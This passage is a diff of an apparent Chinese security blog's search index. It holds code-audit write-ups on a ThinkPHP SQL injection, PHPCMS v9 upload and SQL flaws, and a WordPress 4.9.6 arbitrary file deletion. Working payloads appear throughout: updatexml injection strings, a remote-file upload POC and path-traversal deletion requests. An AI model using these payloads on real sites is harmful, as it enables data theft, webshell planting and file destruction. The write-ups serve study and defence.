&amp;&amp; <span class="literal">false</span> === strpos(<span class="variable">$key</span>,<span class="string">&#x27;|&#x27;</span>) &amp;&amp; <span class="literal">false</span> === strpos(<span class="variable">$key</span>,<span class="string">&#x27;&amp;&#x27;</span>))&#123;</span><br><span class="line">                <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;strict&#x27;</span>]))&#123;</span><br><span class="line">                    E(L(<span class="string">&#x27;_ERROR_QUERY_EXPRESS_&#x27;</span>).<span class="string">&#x27;:[&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;=&gt;&#x27;</span>.<span class="variable">$val</span>.<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">                &#125; </span><br><span class="line">                <span class="keyword">unset</span>(<span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>][<span class="variable">$key</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 查询过后清空sql表达式组装 避免影响下次查询</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;options  =   <span class="keyword">array</span>();</span><br><span class="line">    <span class="comment">// 表达式过滤</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;_options_filter(<span class="variable">$options</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$options</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这其实是一个关键赋值的操作可以引申我们其他的exp</p>
+<p>我们走完<code>_parseOptions</code> <code>$options</code>如下 </p>
+<p><img src="https://tvax4.sinaimg.cn/large/00774lbQly1gsxo6b0jt4j30xc0kojzs.jpg" alt="image-20210729104759128"></p>
+<p>我们现在进入<code>$this-&gt;db-&gt;select</code>中</p>
+<p><img src="https://tvax1.sinaimg.cn/large/00774lbQly1gsxo6guj9gj311f06bdky.jpg" alt="image-20210729104944286"></p>
+<p>继续跟进<code>$this-&gt;buildSelectSql</code></p>
+<p><img src="https://tva2.sinaimg.cn/large/00774lbQly1gsxo6lten3j310p09htew.jpg" alt="image-20210729105024254"></p>
+<p>继续跟进<code>$this-&gt;parseSql</code></p>
+<p>因为我们payload是<code>id[where]=1%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--</code></p>
+<p>所以我们只关心<code>parseWhere</code></p>
+<p><img src="https://tvax2.sinaimg.cn/large/00774lbQly1gsxo6qkr6rj311i0eck11.jpg" alt="image-20210729105430536"></p>
+<p>可以看到没有做任何处理直接返回，所以造成了注入</p>
+<p><img src="https://tvax1.sinaimg.cn/large/00774lbQly1gsxo6v5pqij31390fdwpp.jpg" alt="image-20210729105542661"></p>
+<p>我们回到我上面贴的<code>_parseOptions</code>方法代码，为什么说这里可以引申我们其他exp</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id[<span class="keyword">table</span>]<span class="operator">=</span>users <span class="keyword">where</span> <span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,<span class="keyword">user</span>(),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">--</span></span><br><span class="line">id[alias]<span class="operator">=</span><span class="keyword">where</span><span class="operator">%</span><span class="number">201</span><span class="operator">%</span><span class="number">20</span><span class="keyword">and</span><span class="operator">%</span><span class="number">20</span>updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,<span class="keyword">user</span>(),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">--</span></span><br><span class="line">id[<span class="keyword">where</span>]<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">20</span><span class="keyword">and</span><span class="operator">%</span><span class="number">20</span>updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,<span class="keyword">user</span>(),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$options</span>[<span class="string">&#x27;table&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">// 自动获取表名</span></span><br><span class="line">    <span class="variable">$options</span>[<span class="string">&#x27;table&#x27;</span>] = <span class="keyword">$this</span>-&gt;getTableName();</span><br><span class="line">    <span class="variable">$fields</span>  = <span class="keyword">$this</span>-&gt;fields;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">// 指定数据表 则重新获取字段列表 但不支持类型检测</span></span><br><span class="line">    <span class="variable">$fields</span>  = <span class="keyword">$this</span>-&gt;getDbFields();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 数据表别名</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$options</span>[<span class="string">&#x27;alias&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$options</span>[<span class="string">&#x27;table&#x27;</span>]  .=   <span class="string">&#x27; &#x27;</span>.<span class="variable">$options</span>[<span class="string">&#x27;alias&#x27;</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>1、当我们存在table的话是不是就不需要获取表名。但是有局限性我们得自己知道表名。</p>
+<p>2、当我们存在alias的话。因为不为空进行拼接就构成了我们exp1的形式</p>
+<h1 id="order-by注入"><a href="#order-by注入" class="headerlink" title="order by注入"></a>order by注入</h1><h2 id="漏洞复现-3"><a href="#漏洞复现-3" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>测试代码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Home</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$username</span> = I(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">        <span class="variable">$order</span> = I(<span class="string">&quot;order&quot;</span>);</span><br><span class="line">        <span class="variable">$data</span> = M(<span class="string">&quot;users&quot;</span>)-&gt;where(<span class="keyword">array</span>(<span class="string">&quot;username&quot;</span>=&gt;<span class="variable">$username</span>))-&gt;order(<span class="variable">$order</span>)-&gt;select();</span><br><span class="line">        dump(<span class="variable">$data</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>正常流程</p>
+<p><img src="https://tvax3.sinaimg.cn/large/00774lbQly1gsxo72yltsj31270lfq88.jpg" alt="image-20210729112032146"></p>
+<p>我们的payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?username&#x3D;admin&amp;order[updatexml(1,concat(0x3a,user()),1)]</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tvax1.sinaimg.cn/large/00774lbQly1gsxo79l74jj31cy0j74gd.jpg" alt="image-20210729112157845"></p>
+<h2 id="漏洞分析-3"><a href="#漏洞分析-3" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>问题出现在order上那我们就直接到关键代码吧，流程和上面都一样。</p>
+<p>直接来到<code>Library\Think\Db\Driver.class.php</code></p>
+<p><img src="https://tvax3.sinaimg.cn/large/00774lbQly1gsxo7eg0i2j31670mxdzj.jpg" alt="image-20210729112858917"></p>
+<p>一样没有任何过滤直接返回</p>
+<p><img src="https://tva2.sinaimg.cn/large/00774lbQly1gsxo7j44hwj313f0j9n9k.jpg" alt="image-20210729113145010"></p>
+<p>最终完成语句的拼接</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT * FROM &#96;users&#96; WHERE &#96;username&#96; &#x3D; &#39;admin&#39; ORDER BY updatexml(1,concat(0x3a,user()),1)  </span><br></pre></td></tr></table></figure>
+
 ]]></content>
       <tags>
-        <tag>XSS</tag>
+        <tag>SQL注入</tag>
+        <tag>代码审计</tag>
+        <tag>ThinkPHP</tag>
       </tags>
   </entry>
   <entry>
@@ -487,273 +584,109 @@
       </tags>
   </entry>
   <entry>
-    <title>PHPCMSV9版本代码审计学习</title>
-    <url>/2021/07/17/PHPCMSV9%E7%89%88%E6%9C%AC%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/</url>
-    <content><![CDATA[<p>学习代码审计，自己简单记录一下。如有错误望师傅斧正。</p>
-<h1 id="PHPCMS预备知识"><a href="#PHPCMS预备知识" class="headerlink" title="PHPCMS预备知识"></a>PHPCMS预备知识</h1><p>PHPCMS是采用MVC设计模式开发,基于模块和操作的方式进行访问，采用单一入口模式进行项目部署和访问，无论访问任何一个模块或者功能，只有一个统一的入口。</p>
-<table>
-<thead>
-<tr>
-<th align="left">参数名称</th>
-<th align="left">描述</th>
-<th align="left">位置</th>
-<th align="left">备注</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">m</td>
-<td align="left">模型/模块名称</td>
-<td align="left"><code>phpcms/modules中模块目录名称</code></td>
-<td align="left">必须</td>
-</tr>
-<tr>
-<td align="left">c</td>
-<td align="left">控制器名称</td>
-<td align="left"><code>phpcms/modules/模块/*.php 文件名称</code></td>
-<td align="left">必须</td>
-</tr>
-<tr>
-<td align="left">a</td>
-<td align="left">事件名称</td>
-<td align="left"><code>phpcms/modules/模块/*.php 中方法名称</code></td>
-<td align="left"></td>
-</tr>
-</tbody></table>
-<h1 id="PHPCMSV9-2上传Getshell"><a href="#PHPCMSV9-2上传Getshell" class="headerlink" title="PHPCMSV9.2上传Getshell"></a>PHPCMSV9.2上传Getshell</h1><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>我们搭建好环境直接注册，找到修改头像。</p>
-<p><img src="https://tvax1.sinaimg.cn/large/00774lbQly1gshzrigivnj30z60f2k4s.jpg" alt="image-20210713205932313">)</p>
-<p>我们在本地创建一个zip文件里面包含一个文件夹，一个我们的恶意代码。通过Burp修改掉。</p>
-<p><img src="https://tvax1.sinaimg.cn/large/00774lbQly1gshzrutaqtj30sv0a0454.jpg" alt="image-20210713210052053"></p>
-<p>访问<code>phpsso_server/uploadfile/avatar/1/1/1/av/av.php</code> 其中1是我们的uid</p>
-<p><img src="https://tva2.sinaimg.cn/large/00774lbQly1gshzs49tp2j319d0kaduq.jpg" alt="image-20210713212930046"></p>
-<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>重复以上步骤。通过burp我们找到上传事件，我们直接去代码定位这个函数。</p>
-<p><img src="https://tvax1.sinaimg.cn/large/00774lbQly1gshzsf6w3dj30u80csguv.jpg" alt="image-20210713210251188"></p>
-<p>然后去代码找到函数直接断点调试</p>
-<p><img src="https://tva3.sinaimg.cn/large/00774lbQly1gshzslx85uj30y10hydqz.jpg" alt="image-20210713210620009"></p>
-<p>根据用户UID创建文件夹，防止用户多了文件夹重复创建了两次，然后检测目录创建，没有就创建一次，否则跳过。</p>
-<p><img src="https://tvax4.sinaimg.cn/large/00774lbQly1gshzstn2esj31bj0j6tmz.jpg" alt="image-20210713211150731"></p>
-<p>根据uid重命名我们的压缩包文件</p>
-<p><img src="https://tvax4.sinaimg.cn/large/00774lbQly1gshzt0bshij31c10m5kd9.jpg" alt="image-20210713211348264"></p>
-<p>压缩包的文件就是我们上传的压缩包文件</p>
-<p><img src="https://tva3.sinaimg.cn/large/00774lbQly1gshzt7kgtdj30bk04774r.jpg" alt="image-20210713211535141"></p>
-<p>之后进行解压缩文件</p>
-<p><img src="https://tvax4.sinaimg.cn/large/00774lbQly1gshzti1c3pj31aa0hn17y.jpg" alt="image-20210713211744654"></p>
-<p>之后进入dir中循环判断文件安全，删除压缩包和非jpg图片</p>
-<p><img src="https://tva3.sinaimg.cn/large/00774lbQly1gshztns77ej318n0fb7dw.jpg" alt="image-20210713211943208"></p>
-<p>走到遍历白名单判断文件，排除<code>.</code>（当前目录）<code>..</code>（上级目录）下图删除了压缩包文件</p>
-<p><img src="https://tva1.sinaimg.cn/large/00774lbQly1gshzttgnamj311t0d6gxi.jpg" alt="image-20210713212302942"></p>
-<p>再次循环时$file=av 而av是目录。unlink是不能删除目录的。所以出现异常。</p>
-<p><img src="https://tva2.sinaimg.cn/large/00774lbQly1gshzu0r93cj30z607itd6.jpg" alt="image-20210713212333388"></p>
-<p>所以进而我们的恶意文件留在了服务器里面。这就是为什么上面利用的压缩包里的恶意代码文件需要放在目录下</p>
-<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>不使用zip压缩包处理图片文件。因为后端需要处理特别多的数据。</p>
-<h1 id="PHPCMSV9-6-0任意文件上传漏洞"><a href="#PHPCMSV9-6-0任意文件上传漏洞" class="headerlink" title="PHPCMSV9.6.0任意文件上传漏洞"></a>PHPCMSV9.6.0任意文件上传漏洞</h1><h2 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>先注册然后抓包</p>
-<p><img src="https://tvax4.sinaimg.cn/large/00774lbQly1gshzu6buhdj314l0e67co.jpg" alt="image-20210714095036774"></p>
-<p>其中要准备一个远程的服务器下的恶意代码</p>
-<p><img src="https://tva4.sinaimg.cn/large/00774lbQly1gshzuc5t5hj30nc05bgn0.jpg" alt="image-20210714104836022"></p>
-<p>准备我们的POC如下</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">siteid=1&amp;modelid=11&amp;username=123456&amp;password=123456&amp;email=12345@qq.com&amp;info[content]=<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">http://192.168.0.100/phpinfo.txt?.php#.jpg</span>&gt;</span>&amp;dosubmit=1&amp;protocol=</span><br></pre></td></tr></table></figure>
+    <title>Wordpress&lt;= 4.9.6任意文件删除漏洞</title>
+    <url>/2021/07/29/Wordpress-4-9-6-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<center>Wordpress4.9.6任意文件删除漏洞</center>
 
-<p>然后修改放包会报一个错误，会返回我们的URL路径</p>
-<p><img src="https://tvax2.sinaimg.cn/large/00774lbQly1gshzul1xt5j312y07iafe.jpg" alt="image-20210714095300962"></p>
-<p><img src="https://tvax2.sinaimg.cn/large/00774lbQly1gshzurpcydj31740nv17m.jpg" alt="image-20210714095331750"></p>
-<h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>我们直接找到刚刚我们的包，他是在<code>index.php</code>进入<code>member</code>模块中的<code>index</code>文件里面有一个<code>register</code>函数</p>
-<p><img src="https://tvax2.sinaimg.cn/large/00774lbQly1gshzuy4g3aj31e00gx7jx.jpg" alt="image-20210714100019749"></p>
-<p>我们现在打开我们的代码定位函数，路径如下</p>
-<p><img src="https://tva2.sinaimg.cn/large/00774lbQly1gshzv3xwb0j314q0gnthu.jpg" alt="image-20210714110048083"></p>
-<p>为了更好的理解POC的巧妙。我们正常注册一次然后用POC注册一次分析</p>
-<p><img src="https://tvax1.sinaimg.cn/large/00774lbQly1gshzv9kibwj30x60lhdwc.jpg" alt="image-20210714131702013"></p>
-<p>前面就是一堆信息的验证作用不大，我们继续跟踪到130行</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$member_setting</span>[<span class="string">&#x27;choosemodel&#x27;</span>]) &#123;</span><br><span class="line">	<span class="keyword">require_once</span> CACHE_MODEL_PATH.<span class="string">&#x27;member_input.class.php&#x27;</span>;</span><br><span class="line">	<span class="keyword">require_once</span> CACHE_MODEL_PATH.<span class="string">&#x27;member_update.class.php&#x27;</span>;</span><br><span class="line">	<span class="variable">$member_input</span> = <span class="keyword">new</span> member_input(<span class="variable">$userinfo</span>[<span class="string">&#x27;modelid&#x27;</span>]);		</span><br><span class="line">	<span class="variable">$_POST</span>[<span class="string">&#x27;info&#x27;</span>] = array_map(<span class="string">&#x27;new_html_special_chars&#x27;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;info&#x27;</span>]);</span><br><span class="line">	<span class="variable">$user_model_info</span> = <span class="variable">$member_input</span>-&gt;get(<span class="variable">$_POST</span>[<span class="string">&#x27;info&#x27;</span>]);	<span class="comment">//重点			        	&#125;</span></span><br></pre></td></tr></table></figure>
-
-<p>在这里我们看见<code>$_POST[&#39;info&#39;]</code>使用了<code>member_input</code>类中的<code>get</code>方法我们跟踪进去。</p>
-<p><img src="https://tvax2.sinaimg.cn/large/00774lbQly1gshzvf38lpj313007sq91.jpg" alt="image-20210714172524854"></p>
-<p>走到47行获取了<code>datatime</code>函数，<code>this-&gt;fields</code>是一个动态函数对应的一张表根据<code>modelid</code>来确定的<code>formytpe</code>。如下图</p>
-<p>【也可以跟进去一步步来，微信搜索黑白天的文章。有详细解释，建议自己跟一遍】</p>
-<p><img src="https://tva1.sinaimg.cn/large/00774lbQly1gshzvla65yj31110nmwv0.jpg" alt="image-20210715111531976"></p>
-<p><img src="https://tva3.sinaimg.cn/large/00774lbQly1gshzvsdobdj312108nwj5.jpg" alt="image-20210714172423802"></p>
-<p>我那们跟进去<code>datatime</code>函数 就是做了一校验然后又返回给<code>$value</code></p>
-<p><img src="https://tva1.sinaimg.cn/large/00774lbQly1gshzvy3143j311b0d6gtu.jpg" alt="image-20210715112429559"></p>
-<p>然后就是插入两次数据库，一个插入<code>v9_member</code>表一个生日日期和用户id插入到<code>v9_member_detail</code>表中，至此正常流程走完。</p>
-<p><img src="https://tva1.sinaimg.cn/large/00774lbQly1gshzw4telvj31420fpqap.jpg" alt="image-20210714174943523"></p>
-<p><img src="https://tva1.sinaimg.cn/large/00774lbQly1gshzwaogknj313c0gawno.jpg" alt="image-20210714174429168"></p>
-<p>接下来我们分析一下POC流程</p>
-<blockquote>
-<p>值得注意的是我们必须保证username email是唯一</p>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
+<p>从 3.7.0 版本开始， WordPress 在用户登录时，会在后台对小版本的改变进行更新，这样不利于我们分析代码。我们可以通过将 AUTOMATIC_UPDATER_DISABLED 设置成 true ，来禁止 WordPress 后台自动更新（在 wp-config.php 文件开头添加 define(‘AUTOMATIC_UPDATER_DISABLED’, true); 即可）。</p>
 </blockquote>
-<p> 然后我们继续定位到130行，发现<code>content</code>是我们的内容<img src="https://tvax2.sinaimg.cn/large/00774lbQly1gshzwgqsh5j314t0g5amp.jpg" alt="image-20210715115513282"></p>
-<p> 经过<code>new_html_special_chars</code>就是防止XSS 所以实体化<img src="https://tvax4.sinaimg.cn/large/00774lbQly1gshzwo6x5oj30rc05r77f.jpg" alt="image-20210715115539585"></p>
-<p> 于是我们变成了下面这样子。继续跟踪get方法同上<img src="https://tvax4.sinaimg.cn/large/00774lbQly1gshzwuxkkcj314h0grwrl.jpg" alt="image-20210715115601890"></p>
-<p>这里我们获取的是<code>editor</code>函数。</p>
-<p><img src="https://tva3.sinaimg.cn/large/00774lbQly1gshzx0f0hij313z0dwaig.jpg" alt="image-20210715114208216"></p>
-<p>在这个函数中我们有一个<code>download</code>方法</p>
-<p><img src="https://tva4.sinaimg.cn/large/00774lbQly1gshzx5z7tij60t405hadx02.jpg" alt="image-20210715122725543"></p>
-<p>我们跟踪download方法，发现以下关键代码</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ext &#x3D; &#39;gif|jpg|jpeg|bmp|png&#39;</span><br><span class="line">if(!preg_match_all(&quot;&#x2F;(href|src)&#x3D;([\&quot;|&#39;]?)([^ \&quot;&#39;&gt;]+\.($ext))\\2&#x2F;i&quot;, $string, $matches)) return $value;</span><br></pre></td></tr></table></figure>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>​    先在自己目录下面简单建一个文件，方便测试。WordPress中如果把<code>wp-config.php</code>文件删除系统会重装的。</p>
+<p>我们需要一个角色，最低是一个作者。</p>
+<p><img src="https://tvax4.sinaimg.cn/large/00774lbQly1gsmji0fvn2j30x80o143x.jpg" alt="image-20210719111653371"></p>
+<p>然后用test用户登录，如下图操作。再点编辑。</p>
+<p><img src="https://tvax2.sinaimg.cn/large/00774lbQly1gsmji5wcsbj31ec0gytfn.jpg" alt="image-20210719111910193"></p>
+<p>然后我们在F12里面搜索<code>_wpnonce</code>找到这两个东西</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;input type&#x3D;&quot;hidden&quot; id&#x3D;&quot;_wpnonce&quot; name&#x3D;&quot;_wpnonce&quot; value&#x3D;&quot;09a8cc3a73&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;a class&#x3D;&quot;submitdelete deletion&quot; onclick&#x3D;&quot;return showNotice.warn();&quot; href&#x3D;&quot;http:&#x2F;&#x2F;localhost&#x2F;dmsj&#x2F;wordpress49&#x2F;wp-admin&#x2F;post.php?post&#x3D;6&amp;action&#x3D;delete&amp;_wpnonce&#x3D;004d81ba04&quot;&gt;永久删除&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>
 
-<p>这就是为什么我们写info[content]=&lt;img src-<a href="http://xxxx/phpinfo.txt?.php#.jpg%EF%BC%88%E7%AC%A6%E5%90%88%E8%BF%99%E4%B8%AA%E6%A0%BC%E5%BC%8F%EF%BC%8C%E8%80%8C%E4%B8%94%E5%8A%A0%60.jpg%60%E7%9A%84%E5%8E%9F%E5%9B%A0%EF%BC%89">http://xxxx/phpinfo.txt?.php#.jpg（符合这个格式，而且加`.jpg`的原因）</a></p>
-<p>到155行这里他把我们的<code>$string</code>值复制给了<code>$matches</code> </p>
-<p>$matches [3]刚好是我们的链接，所以真的很巧妙</p>
-<p><img src="https://tva1.sinaimg.cn/large/00774lbQly1gshzxbfvs3j313b0h6gxm.jpg" alt="image-20210715120332699"></p>
-<p>接着我们跟踪<code>fillurl</code>方法,里面有一串关键代码如下</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$pos &#x3D; strpos($surl,&#39;#&#39;);</span><br><span class="line">		if($pos&gt;0) $surl &#x3D; substr($surl,0,$pos);</span><br></pre></td></tr></table></figure>
+<p>然后点击更新然后抓包到<code>Repeater</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;input type&#x3D;&quot;hidden&quot; id&#x3D;&quot;_wpnonce&quot; name&#x3D;&quot;_wpnonce&quot; value&#x3D;&quot;09a8cc3a73&quot;&gt;</span><br><span class="line">&#x2F;&#x2F; 将POST包替换为如下 其中post_ID对应你URL对应的POST  </span><br><span class="line">&#x2F;&#x2F; thumb对应删除文件 _wpnonce对应上面的value</span><br><span class="line">POST值</span><br><span class="line">action&#x3D;editattachment&amp;_wpnonce&#x3D;09a8cc3a73&amp;post_ID&#x3D;6&amp;thumb&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;test.txt</span><br></pre></td></tr></table></figure>
 
-<p><code>strpos</code>定位#，然后使用<code>substr</code>处理<code>?.php#.jpg</code>，处理完之后<code>$surl =?.php</code>继续执行，可以发现返回的url去掉了#后面的内容</p>
-<p><img src="https://tvax1.sinaimg.cn/large/00774lbQly1gshzxh2uw7j60zb0fwqds02.jpg" alt="image-20210715120530900"></p>
-<p>然后获取后缀名。然后通过<code>getname</code>方法生成时间+三位数的文件名，如果不返回文件地址的url我们也可以进行爆破处理。</p>
-<p><img src="https://tva3.sinaimg.cn/large/00774lbQly1gshzxmxzf2j312506c7b0.jpg" alt="image-20210715121811584"></p>
-<p><img src="https://tva4.sinaimg.cn/large/00774lbQly1gshzxrz6f9j30no03w3ze.jpg" alt="image-20210715121521423"></p>
-<p>此时进行了<code>copy</code>函数对远程文件下载</p>
-<p><img src="https://tva4.sinaimg.cn/large/00774lbQly1gshzxx4awzj31380aun5c.jpg" alt="image-20210715123850218"></p>
-<p>这里的<code>$this-&gt;upload_func</code>是copy函数的原因，是因为初始化时赋给的</p>
-<p><img src="https://tva1.sinaimg.cn/large/00774lbQly1gshzy2dovdj30po07jjvj.jpg" alt="image-20210715123444761"></p>
-<p>此时我们的文件已经到我们的本地了</p>
-<p><img src="https://tva4.sinaimg.cn/large/00774lbQly1gshzy7gau7j30ql0503zr.jpg" alt="image-20210715124006568"></p>
-<p>接着我们来看看写入文件的路劲是如何返回给我们的。上面程序执行完以后，回到了<code>register </code>函数中：</p>
-<p>继续跟进<code>$this-&gt;db-&gt;insert($user_model_info);</code> 发现数据库插入的字段都不一样继续执行就会报错。前台提示的信息一样，没有这个字段当然报错</p>
-<p>Message : Unknown column ‘content’ in ‘field list’</p>
-<p><img src="https://tva2.sinaimg.cn/large/00774lbQly1gshzycogp2j310f0lk4e2.jpg" alt="image-20210715124757737"></p>
-<h2 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>在phpcms9.6.1中修复了该漏洞，修复方案就是对用<code>fileext</code>获取到的文件后缀再用黑白名单分别过滤一次</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$filename</span> = fileext(<span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&quot;/(<span class="subst">$ext</span>)/is&quot;</span>,<span class="variable">$filename</span>) || in_array(<span class="variable">$filename</span>, 		<span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;phtml&#x27;</span>,<span class="string">&#x27;php3&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;jsp&#x27;</span>,<span class="string">&#x27;dll&#x27;</span>,<span class="string">&#x27;asp&#x27;</span>,<span class="string">&#x27;cer&#x27;</span>,<span class="string">&#x27;asa&#x27;</span>,<span class="string">&#x27;shtml&#x27;</span>,<span class="string">&#x27;shtm&#x27;</span>,<span class="string">&#x27;aspx&#x27;</span>,<span class="string">&#x27;asax&#x27;</span>,<span class="string">&#x27;cgi&#x27;</span>,<span class="string">&#x27;fcgi&#x27;</span>,<span class="string">&#x27;pl&#x27;</span>)))&#123;</span><br><span class="line"> 			<span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://tvax2.sinaimg.cn/large/00774lbQly1gsmjibftllj30yh0pjqit.jpg" alt="image-20210719133908256"></p>
+<p>这样子是证明写入数据库了，报错就说明失败了。我们查看wp_postmeta发现成功写入</p>
+<p><img src="https://tva4.sinaimg.cn/large/00774lbQly1gsmjifzw68j310t0al10t.jpg" alt="image-20210719134001572"></p>
+<p>然后我们第二步</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">_wpnonce&#x3D;004d81ba04&quot;&gt;永久删除&lt;&#x2F;a&gt;</span><br><span class="line">&#x2F;&#x2F; GET请求下面URL  _wpnonce对应上面的值</span><br><span class="line">&#x2F;wp-admin&#x2F;post.php?post&#x3D;6&amp;action&#x3D;delete&amp;_wpnonce&#x3D;004d81ba04</span><br></pre></td></tr></table></figure>
 
-<h1 id="PHPCMSV9-6-0-WAP模块-SQL注入分析"><a href="#PHPCMSV9-6-0-WAP模块-SQL注入分析" class="headerlink" title="PHPCMSV9.6.0 WAP模块 SQL注入分析"></a>PHPCMSV9.6.0 WAP模块 SQL注入分析</h1><h2 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>首先第一步访问</p>
-<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">/index.php?m=wap&amp;c=index&amp;siteid=1</span><br></pre></td></tr></table></figure>
+<p>然后我们的文件以及被删除</p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>倒着来分析吧，首先直接定位wp-admin/post.php文件246行</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">&#x27;delete&#x27;</span>:</span><br><span class="line">	check_admin_referer(<span class="string">&#x27;delete-post_&#x27;</span> . <span class="variable">$post_id</span>);</span><br><span class="line">	<span class="keyword">if</span> ( ! <span class="variable">$post</span> )</span><br><span class="line">		wp_die( __( <span class="string">&#x27;This item has already been deleted.&#x27;</span> ) );</span><br><span class="line">	<span class="keyword">if</span> ( ! <span class="variable">$post_type_object</span> )</span><br><span class="line">		wp_die( __( <span class="string">&#x27;Invalid post type.&#x27;</span> ) );</span><br><span class="line">	<span class="keyword">if</span> ( ! current_user_can( <span class="string">&#x27;delete_post&#x27;</span>, <span class="variable">$post_id</span> ) )</span><br><span class="line">		wp_die( __( <span class="string">&#x27;Sorry, you are not allowed to delete this item.&#x27;</span> ) );</span><br><span class="line">	<span class="keyword">if</span> ( <span class="variable">$post</span>-&gt;post_type == <span class="string">&#x27;attachment&#x27;</span> ) &#123;</span><br><span class="line">		<span class="variable">$force</span> = ( ! MEDIA_TRASH );</span><br><span class="line">		<span class="keyword">if</span> ( ! wp_delete_attachment( <span class="variable">$post_id</span>, <span class="variable">$force</span> ) )</span><br><span class="line">			wp_die( __( <span class="string">&#x27;Error in deleting.&#x27;</span> ) );</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> ( ! wp_delete_post( <span class="variable">$post_id</span>, <span class="literal">true</span> ) )</span><br><span class="line">			wp_die( __( <span class="string">&#x27;Error in deleting.&#x27;</span> ) );</span><br><span class="line">	